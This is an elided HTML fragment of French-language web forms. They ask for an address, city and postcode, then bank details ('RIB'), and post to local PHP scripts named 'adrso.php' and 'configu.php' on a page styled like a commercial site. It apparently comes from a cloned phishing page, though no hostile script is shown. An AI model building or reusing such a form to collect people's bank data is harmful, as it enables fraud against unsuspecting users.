                                ...
                                <div class="mx-auto max-w-page-max pt-xl">
                                    <div class="px-lg sm:w-sz-672">
                                        ...
                                        <div
                                            ...
                                            <form method="post" action="./adrso.php">
                                                <div class="gap-xl sm:flex [&amp;>div]:flex-1">
                                                    <div
                                                        data-spark-component="form-field"
                                                        class="mt-lg flex flex-col gap-sm">
                                                        <label
                                                            data-spark-component="form-field-label"
                                                            class="text-body-1 flex items-center gap-sm"
                                                            id="radix-:r4e:"
                                                            for="radix-:r4d:">Adresse<span
                                                                data-spark-component="label-required-indicator"
                                                                role="presentation"
                                                                aria-hidden="true"
                                                                class="text-caption text-on-surface/dim-1">*</span>
                                                        </label>
                                                        <input
                                                            id="adoirs"
                                                            ...
                                                            value=""
                                                            data-sider-insert-id="69f71950-7e69-4520-91c0-ea9bc655496b"
                                                            data-sider-select-id="f33b4d33-c086-459f-9a10-8f1d20880d3a" />
                                                    </div>
                                                    <div
                                                        class="relative styles_locationInput__hYMeh"
                                                        data-test-id="locationInputWrapper">
                                                        <div class="_3Hrjq">
                                                            <label
                                                                class="_3Rgki _3q0nF _1pHkp"
                                                                for="location">Ville et code postal<span class="_2GpA3">champs requis</span></label>
                                                            <div class="ZlsP9 _1mwQl aj3_W FB92D">
                                                                <span class="_1p6Mu">
                                                                    <svg
                                                                        ...
                                                                        display="inline"
                                                                        role="img"
                                                                        class="src__Box-sc-10d053g-0 src___StyledBox-sc-fochin-0 ggyzWD gfeOno">
                                                ...
                                                <button
                                                    data-spark-component="button"
                                                    type="submit"
                                                    class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused mt-2xl min-w-full md:min-w-fit"
                                                    aria-busy="false"
                                                    aria-live="off">
                                        ...
                                        <form method="post" action="../../configu.php">
                                            <div
                                                class="mb-2xl border-b-sm border-neutral/dim-4 pb-2xl">
                                                <h2 class="mb-xl text-headline-2 text-on-surface">
                                                    RIB
